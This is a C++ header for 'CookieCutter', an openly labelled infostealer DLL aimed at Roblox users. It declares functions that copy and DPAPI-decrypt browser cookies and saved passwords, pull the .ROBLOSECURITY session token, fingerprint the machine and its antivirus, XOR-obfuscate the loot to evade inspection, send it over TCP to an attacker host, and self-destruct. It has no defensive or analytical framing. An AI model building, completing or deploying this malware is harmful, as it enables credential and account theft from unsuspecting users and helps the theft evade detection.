#pragma once
//=============================================================================
//  CookieCutter — Roblox Post-Exploitation Harvester
//  Native DLL header. Exports callable from Lua executor or standalone.
//  Built for LO. x64, static CRT, no external dependencies beyond WinAPI.
//=============================================================================

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <wincrypt.h>
#include <string>
#include <vector>
#include <cstdint>

#ifdef COOKIECUTTER_EXPORTS
  #define CC_API __declspec(dllexport)
#else
  #define CC_API __declspec(dllimport)
#endif

// ---------------------------------------------------------------------------
//  Data structures
// ---------------------------------------------------------------------------

struct CookieEntry {
    std::string host;          // e.g. ".roblox.com"
    std::string name;          // e.g. ".ROBLOSECURITY"
    std::string value;         // decrypted plaintext
    std::string path;          // e.g. "/"
    int64_t     expiry;        // unix timestamp
    bool        secure;
    bool        httpOnly;
    std::string browser;       // "Chrome", "Edge", "Firefox", etc.
};

struct CredentialEntry {
    std::string url;           // origin URL
    std::string username;
    std::string password;      // decrypted
    std::string browser;
};

struct BrowserProfile {
    std::wstring name;              // e.g. L"Chrome"
    std::wstring cookiePath;        // full path to Cookies / Network\Cookies
    std::wstring loginDataPath;     // full path to Login Data
    std::wstring localStatePath;    // for Chrome >= v130 AES key
    std::wstring profileDir;        // root profile directory
    bool        isChromium;         // true = Chrome/Edge/Brave/etc, false = Firefox
};

// ---------------------------------------------------------------------------
//  Exported functions (callable from Lua via load_dll / ffi / whatever)
// ---------------------------------------------------------------------------

extern "C" {

    // --- Cookie harvesting ---
    // Copies browser DBs → temp, parses SQLite, DPAPI-decrypts, writes JSON.
    // Returns true on success, JSON written to outputPath (UTF-16 path).
    CC_API bool HarvestCookies(const wchar_t* outputJsonPath);

    // --- Credential harvesting ---
    // Reads Login Data / logins.json from all browsers, DPAPI-decrypts, writes JSON.
    CC_API bool HarvestCredentials(const wchar_t* outputJsonPath);

    // --- Roblox-specific ---
    // Extracts .ROBLOSECURITY from any browser that has it.
    // Caller provides buffer; on return cookieOut is filled and size is actual length.
    CC_API bool HarvestRobloxCookie(char* cookieOut, size_t* size);

    // --- Recon ---
    // Fills buffer with hostname, username, IPs, AV list, etc. as JSON.
    CC_API bool GetFingerprint(char* infoOut, size_t* size);

    // --- Exfiltration ---
    // TCP socket send. Because target users have firewall OFF.
    // Encrypts payload with XOR before sending (keeps DPI off our back).
    CC_API bool ExfilTCP(const char* host, int port, const char* jsonPayload);

    // --- Cleanup ---
    // Overwrites temp files, zeros sensitive buffers, unloads.
    CC_API void SelfDestruct();

    // --- Helper: get all browser profiles found on this machine ---
    // Returns count; caller passes pre-allocated array.
    CC_API int EnumerateBrowsers(BrowserProfile* out, int maxCount);

    // --- Helper: DPAPI decrypt raw blob (exposed for Lua-side fallback) ---
    CC_API bool DPADecryptBlob(
        const uint8_t* ciphertext, size_t cipherLen,
        uint8_t* plaintext, size_t* plainLen
    );
}

// ---------------------------------------------------------------------------
//  Internal helpers (not exported, used by the modules above)
// ---------------------------------------------------------------------------
namespace cookiecutter {
    bool CopyFileToTemp(const std::wstring& src, std::wstring& outTemp);
    bool ReadEntireFile(const std::wstring& path, std::vector<uint8_t>& out);
    bool WriteEntireFile(const std::wstring& path, const void* data, size_t len);
    bool DPADecrypt(const std::vector<uint8_t>& ciphertext, std::vector<uint8_t>& plaintext);
    std::string BuildCookieJson(const std::vector<CookieEntry>& cookies);
    std::string BuildCredentialJson(const std::vector<CredentialEntry>& creds);
    std::string GetMachineFingerprint();
    void XorEncrypt(uint8_t* data, size_t len, const uint8_t* key, size_t keyLen);
    void SecureZero(void* ptr, size_t len);
    std::wstring GetTempDir();
}
